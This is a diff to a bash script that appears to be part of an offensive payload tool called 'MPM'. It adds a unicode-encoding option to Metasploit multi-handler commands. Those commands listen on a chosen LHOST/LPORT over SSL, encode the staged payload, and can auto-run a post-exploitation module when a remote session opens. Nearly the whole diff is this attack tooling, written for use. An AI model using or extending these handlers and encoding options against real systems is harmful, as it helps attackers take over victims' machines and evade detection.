@@ -43,7 +43,7 @@ DEFAULT_EXT=`cat $IPATH/settings | egrep -m 1 "PAYLOAD_EXTENSION" | cut -d '=' -
 ENCODE_NUMB=`cat $IPATH/settings | egrep -m 1 "ENCODER_INTERACTIONS" | cut -d '=' -f2` > /dev/null 2>&1 # Interactions to encode (0|9)
 ExEc=`cat $IPATH/settings | egrep -m 1 "RUN_POST_EXPLOTATION" | cut -d '=' -f2` > /dev/null 2>&1 # Run post-exploitation at session popup?
 PoSt=`cat $IPATH/settings | egrep -m 1 "POST_MODULE" | cut -d '=' -f2` > /dev/null 2>&1 # Msf command to run at session popup?
-
+VaL=`cat $IPATH/settings | egrep -m 1 "ENABLE_UNICODE_ENCODING" | cut -d '=' -f2` > /dev/null 2>&1 # enable unicode encoding?
 
 
 #
@@ -333,9 +333,9 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
   if [ "$ExEc" = "YES" ]; then
     # Run post-exploitation module 
-    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder $ENCODE; set AutoRunScript $PoSt; exploit'"
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding true; set StageEncoder $ENCODE; set AutoRunScript $PoSt; exploit'"
   else
-    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder $ENCODE; exploit'"
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding true; set StageEncoder $ENCODE; exploit'"
   fi
   sleep 2
 
@@ -376,9 +376,9 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
   if [ "$ExEc" = "YES" ]; then
     # Run post-exploitation module 
-    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder $ENCODE; set AutoRunScript $PoSt; exploit'"
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding true; set StageEncoder $ENCODE; set AutoRunScript $PoSt; exploit'"
   else
-    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder $ENCODE; exploit'"
+    xterm -T "MPM - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding true; set StageEncoder $ENCODE; exploit'"
   fi
   sleep 2
 
